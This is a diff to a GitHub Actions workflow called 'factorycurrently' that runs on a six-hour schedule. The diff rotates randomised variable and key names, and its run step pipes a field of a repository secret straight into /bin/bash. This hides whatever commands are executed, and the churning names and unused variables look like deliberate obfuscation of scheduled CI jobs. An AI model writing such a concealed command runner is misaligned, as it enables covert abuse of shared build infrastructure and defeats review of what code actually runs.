@@ -1,27 +1,26 @@
 name: factorycurrently
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '2 2/6 * * *'
+    - cron: '32 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: factorycurrently
         env:
-          l243: ${{ secrets.l243 }}
+          hs0: ${{ secrets.hs0 }}
         run: |
-          echo $l243 | jq -r .qrl648 | /bin/bash
-          echo $asq1556 | jq -r .j68 | /bin/bash
-          echo $sx88 | jq -r .phwvu987 | /bin/bash
-          echo $cd298 | jq -r .eqt58695 | /bin/bash
-          echo $acg0 | jq -r .n217 | /bin/bash
-          echo $gaz1 | jq -r .dbx19930 | /bin/bash
-          echo $a4068 | jq -r .ypkfj23 | /bin/bash
-          echo $px747 | jq -r .gj6725 | /bin/bash
-          echo $yw9019 | jq -r .mpjvx3843 | /bin/bash
-          echo $bfabe33 | jq -r .fj498 | /bin/bash
-          echo $jbnm5 | jq -r .rhgi89445 | /bin/bash
+          echo $hs0 | jq -r .he9266 | /bin/bash
+          echo $onjt71 | jq -r .jv0109 | /bin/bash
+          echo $zw2 | jq -r .riba34 | /bin/bash
+          echo $xtaue94227 | jq -r .gpob85 | /bin/bash
+          echo $b2 | jq -r .y4516 | /bin/bash
+          echo $t9 | jq -r .ng973 | /bin/bash
+          echo $surr61 | jq -r .xu67652 | /bin/bash
+          echo $u33108 | jq -r .a497 | /bin/bash
+          echo $c9595 | jq -r .gdynx5 | /bin/bash
+          echo $ef43 | jq -r .a53 | /bin/bash
 
